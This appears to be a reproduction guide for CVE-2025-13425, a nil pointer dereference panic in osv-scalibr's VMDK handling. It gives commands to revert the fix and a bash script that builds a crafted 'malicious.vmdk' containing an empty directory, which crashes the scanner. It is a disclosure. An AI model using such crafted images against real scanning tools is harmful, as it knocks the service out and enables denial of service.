To reporoduce the CVE-2025-13425 just follow the steps below:

- Step 1: Clone the fresh osv-scalibr source code:
	```
	$ git clone https://github.com/google/osv-scalibr
	```

- Step 2: Remove the code mentioned in fix commit https://github.com/google/osv-scalibr/commit/e67c4e198ca099cb7c16957a80f6c5331d90a672

- Step 3: Use the vmdk.go.patch patch and apply it to vmdk.go with:
	```
	$ cd osv-scalibr
	$ git apply /path/to/vmdk.go.patch
	```

	- Why do we need these changes to vmdk.go ?

		This is just an example and this bug is not just limited to vmdk plugin. This is required to trigger the bug. The bug triggers when someone writes their own plugin which traverses a virtual filesystem contained inside a file. The bug is in the way osv-scalibr handles virtual filesystems. This bug will go unnoticed during compilation or production but it'll get triggered when user supplies a vmdk file which contains at least one empty directory.
		

- Step 4: Compile the source code to get the "scalibr" binary:
	```
	$ make clean && make
	```

- Step 5: Trigger with:
	```
	$ go test -v ./extractor/filesystem/embeddedfs/vmdk/

		Expected output:

		...
			=== RUN   TestExtractValidVMDK/DiskImage_1
    			vmdk_test.go:87: GetEmbeddedFS() failed: unsupported filesystem type unknown for partition 2
			--- FAIL: TestExtractValidVMDK (1.35s)
			    --- PASS: TestExtractValidVMDK/DiskImage_0 (0.02s)
			    --- FAIL: TestExtractValidVMDK/DiskImage_1 (0.00s)
			panic: runtime error: invalid memory address or nil pointer dereference [recovered]
				panic: runtime error: invalid memory address or nil pointer dereference
			[signal SIGSEGV: segmentation violation code=0x1 addr=0x20 pc=0x7613e2]
		...
	```

	OR

	You can generate a malicious (or minimal) vmdk image which contains an empty directory. To do this, create a new bash script with the following code (say gen_malicious_vmdk.sh):
	```
	#!/usr/bin/env bash

	dd if=/dev/zero of=valid.img bs=1M count=20
	parted -s --align optimal valid.img --script mklabel gpt
	parted -s --align optimal valid.img --script mkpart primary ext4 0% 100%
	sudo losetup -fP valid.img
	LOOPDEV=$(losetup -j valid.img | cut -d: -f1)
	PARTITION1="${LOOPDEV}p1"
	sudo mkfs.ext4 $PARTITION1
	sudo rm -rf /mnt/valid*
	sudo mkdir /mnt/valid
	sudo mount ${PARTITION1} /mnt/valid
	sudo mkdir /mnt/valid/empty_dir
	sudo umount /mnt/valid
	sudo losetup -d ${LOOPDEV}
	sudo rm -rf /mnt/valid* *.vmdk
	qemu-img convert valid.img -O vmdk malicious.vmdk
	```

	Now,

	```
	$ chmod +x gen_malicious_vmdk.sh
	$ ./gen_malicious_vmdk.sh
	```

	It will create a file called "malicious.vmdk". Now trigger the vulnerability with:
	```
	$ ./scalibr --extractors=embeddedfs/vmdk -o textproto=output.txt malicious.vmdk

		Expected output:

			2025/11/05 19:02:45 Running scan with 1 plugins
			2025/11/05 19:02:45 Paths to extract: [../try/malicious.vmdk]
			2025/11/05 19:02:45 Scan roots: [%!s(*fs.ScanRoot=&{/ /})]
			2025/11/05 19:02:45 Starting filesystem walk for root: /
			2025/11/05 19:02:45 End status: 0 dirs visited, 1 inodes visited, 1 Extract calls, 124.392222ms elapsed, 124.392999ms wall time
			2025/11/05 19:02:45 Starting filesystem walk for root: 
			panic: runtime error: invalid memory address or nil pointer dereference
				panic: runtime error: invalid memory address or nil pointer dereference
			[signal SIGSEGV: segmentation violation code=0x1 addr=0x10 pc=0x1fbb303]
			...
	```

CVE-2025-13425 discovered by Yuvraj Saxena (ysaxenax@gmail.com)
